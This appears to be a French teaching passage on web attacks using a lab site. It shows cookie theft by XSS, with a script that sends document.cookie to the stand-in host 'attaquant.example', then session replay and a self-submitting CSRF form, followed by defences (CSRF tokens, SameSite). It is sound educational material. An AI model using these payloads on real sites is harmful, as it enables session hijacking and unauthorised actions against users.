Le site te reconnaît grâce à un **cookie de session**. Qui possède ce cookie *est* toi, pour le serveur. Une XSS permet de le voler.

## Lire les cookies en JavaScript

Dans la console du navigateur (`F12`), sur n'importe quel site :

```js
document.cookie
```

Tu vois les cookies de la page, **sauf** ceux marqués `HttpOnly`. Ce drapeau dit au navigateur : « ce cookie part au serveur, mais aucun script ne peut le lire ».

## Exfiltrer

Le code injecté tourne chez la victime. Il faut faire sortir l'information vers un serveur que tu contrôles. Le plus simple est de charger une image dont l'adresse contient le secret :

```html
<script>
new Image().src = 'https://attaquant.example/collecte?c=' + encodeURIComponent(document.cookie);
</script>
```

Le navigateur de la victime fait la requête, ton serveur la note dans son journal, et tu récupères le cookie. En test réel, on utilise un serveur à soi ou un outil comme Burp Collaborator, **jamais** un service tiers inconnu qui garderait les données du client.

## Rejouer la session

Avec le cookie volé, ouvre l'outil de développement, onglet *Application* (ou *Stockage*), et remplace la valeur de ton cookie de session par celle de la victime. Recharge : tu es elle.

## Le cousin : CSRF

Même sans XSS, un autre site peut faire agir ton navigateur. Si tu es connecté à l'intranet et que tu visites une page piégée contenant :

```html
<form action="http://intranet.morel/messages" method="post">
  <input name="texte" value="Je démissionne.">
</form>
<script>document.forms[0].submit()</script>
```

ton navigateur envoie le formulaire **avec ton cookie**. C'est la falsification de requête intersite (CSRF). Elle ne lit rien, mais elle agit en ton nom.

Deux protections, à cumuler :

1. **Un jeton CSRF** : une valeur aléatoire cachée dans chaque formulaire, que le site pirate ne peut pas deviner.
2. **`SameSite=Lax`** sur le cookie de session : le navigateur ne l'envoie plus sur les requêtes POST venues d'un autre site.

Brèche elle-même utilise les deux : ouvre le code source d'un de ses formulaires et cherche le champ `csrf`.
